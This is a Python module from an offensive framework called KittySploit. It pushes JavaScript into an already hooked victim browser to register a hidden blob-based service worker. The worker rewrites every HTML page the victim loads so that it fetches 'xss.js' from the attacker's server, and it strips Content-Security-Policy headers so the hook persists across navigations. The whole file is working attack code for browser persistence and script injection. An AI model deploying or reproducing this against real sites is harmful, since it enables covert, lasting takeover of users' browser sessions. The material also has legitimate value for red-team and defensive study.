from kittysploit import *
import json


class Module(BrowserAuxiliary):

	__info__ = {
		"name": "Service Worker Register",
		"description": "Register a persistent service worker that re-injects the KittySploit hook on HTML navigations",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}

	scope = OptString("./", "Service worker scope (same-origin path prefix)", False)
	reinject_hook = OptBool(True, "Inject the browser hook script on HTML responses within scope", False)
	unregister = OptBool(False, "Unregister blob-based KittySploit service workers instead of registering", False)

	def run(self):
		scope_val = str(self.scope or "./").strip() or "./"
		reinject = self._to_bool(self.reinject_hook)
		unregister = self._to_bool(self.unregister)
		marker = "kittysploit-persistence-sw"

		if unregister:
			code_js = """
			(function() {
				if (!('serviceWorker' in navigator)) {
					return JSON.stringify({ supported: false, error: 'serviceWorker API unavailable' });
				}
				return navigator.serviceWorker.getRegistrations().then(function(regs) {
					let removed = 0;
					return Promise.all(regs.map(function(reg) {
						const url = (reg.active && reg.active.scriptURL)
							|| (reg.installing && reg.installing.scriptURL)
							|| (reg.waiting && reg.waiting.scriptURL)
							|| '';
						if (url.indexOf('blob:') !== 0) {
							return Promise.resolve(false);
						}
						return reg.unregister().then(function(ok) {
							if (ok) { removed++; }
							return ok;
						});
					})).then(function() {
						return JSON.stringify({ supported: true, unregistered: removed });
					});
				}).catch(function(e) {
					return JSON.stringify({ supported: false, error: e.message || String(e) });
				});
			})();
			"""
			result = self.send_js_and_wait_for_response(code_js, timeout=15.0)
			if not result:
				print_error("Failed to unregister service workers")
				return False
			try:
				data = json.loads(result)
			except json.JSONDecodeError:
				print_error(f"Unexpected response: {result}")
				return False
			if not data.get("supported", True):
				print_error(data.get("error", "serviceWorker unavailable"))
				return False
			print_success(f"Unregistered {data.get('unregistered', 0)} blob service worker registration(s)")
			return True

		reinject_js = "true" if reinject else "false"
		code_js = """
		(function() {
			const MARKER = '%s';
			const SCOPE = %s;
			const REINJECT = %s;

			if (!('serviceWorker' in navigator)) {
				return JSON.stringify({ supported: false, error: 'serviceWorker API unavailable' });
			}
			if (!window.isSecureContext) {
				return JSON.stringify({ supported: false, error: 'Service workers require a secure context (HTTPS or localhost)' });
			}

			let SERVER_HOST = '127.0.0.1';
			let SERVER_PORT = '8080';
			if (window.kittysploit) {
				if (typeof window.kittysploit.getServerHost === 'function') {
					SERVER_HOST = window.kittysploit.getServerHost();
				}
				if (typeof window.kittysploit.getServerPort === 'function') {
					SERVER_PORT = window.kittysploit.getServerPort();
				}
			}

			const hookUrl = 'http://' + SERVER_HOST + ':' + SERVER_PORT + '/xss.js';
			const swSource = [
				'const MARKER = ' + JSON.stringify(MARKER) + ';',
				'const HOOK_URL = ' + JSON.stringify(hookUrl) + ';',
				'const REINJECT = ' + REINJECT + ';',
				"self.addEventListener('install', function() { self.skipWaiting(); });",
				"self.addEventListener('activate', function(event) { event.waitUntil(self.clients.claim()); });",
				"self.addEventListener('fetch', function(event) {",
				"  if (!REINJECT || event.request.mode !== 'navigate') { return; }",
				"  event.respondWith(fetch(event.request).then(function(response) {",
				"    const ct = (response.headers.get('content-type') || '').toLowerCase();",
				"    if (!ct.includes('text/html')) { return response; }",
				"    return response.text().then(function(html) {",
				"      if (html.indexOf(MARKER) !== -1) { return response; }",
				"      const tag = '<script id=\"' + MARKER + '\" src=\"' + HOOK_URL + '\"></script>';",
				"      let injected = html;",
				"      if (html.indexOf('</head>') !== -1) {",
				"        injected = html.replace('</head>', tag + '</head>');",
				"      } else if (html.indexOf('<body') !== -1) {",
				"        injected = html.replace(/<body([^>]*)>/i, '<body$1>' + tag);",
				"      } else {",
				"        injected = tag + html;",
				"      }",
				"      const headers = new Headers(response.headers);",
				"      headers.delete('content-security-policy');",
				"      headers.delete('content-security-policy-report-only');",
				"      return new Response(injected, { status: response.status, statusText: response.statusText, headers: headers });",
				"    }).catch(function() { return response; });",
				"  }));",
				"});"
			].join('\\n');

			const blob = new Blob([swSource], { type: 'application/javascript' });
			const blobUrl = URL.createObjectURL(blob);

			return navigator.serviceWorker.register(blobUrl, { scope: SCOPE })
				.then(function(reg) {
					return JSON.stringify({
						supported: true,
						registered: true,
						scope: reg.scope,
						scriptURL: blobUrl,
						reinject_hook: REINJECT,
						hook_url: hookUrl,
						marker: MARKER
					});
				})
				.catch(function(e) {
					return JSON.stringify({ supported: false, error: e.message || String(e), scope: SCOPE });
				});
		})();
		""" % (marker, json.dumps(scope_val), reinject_js)

		result = self.send_js_and_wait_for_response(code_js, timeout=20.0)
		if not result:
			print_error("Failed to register service worker")
			return False

		if isinstance(result, str) and result.startswith("Error:"):
			print_error(result)
			return False

		try:
			data = json.loads(result)
		except json.JSONDecodeError as exc:
			print_error(f"Failed to parse service worker response: {exc}")
			print_debug(f"Raw response: {result}")
			return False

		if not data.get("registered"):
			print_error(data.get("error", "Service worker registration failed"))
			if data.get("scope"):
				print_info(f"Tried scope: {data['scope']}")
			print_warning("Try a narrower scope (e.g. ./path/) if the origin root is not controlled")
			return False

		print_success("Service worker registered for browser persistence")
		print_info(f"  Scope: {data.get('scope', scope_val)}")
		print_info(f"  Hook URL: {data.get('hook_url', '')}")
		print_info(f"  Re-inject on navigation: {data.get('reinject_hook', reinject)}")
		print_warning("Persistence survives same-origin navigations until SW is unregistered")
		print_info("Use unregister=True on this module to remove blob-based KittySploit service workers")
		return True
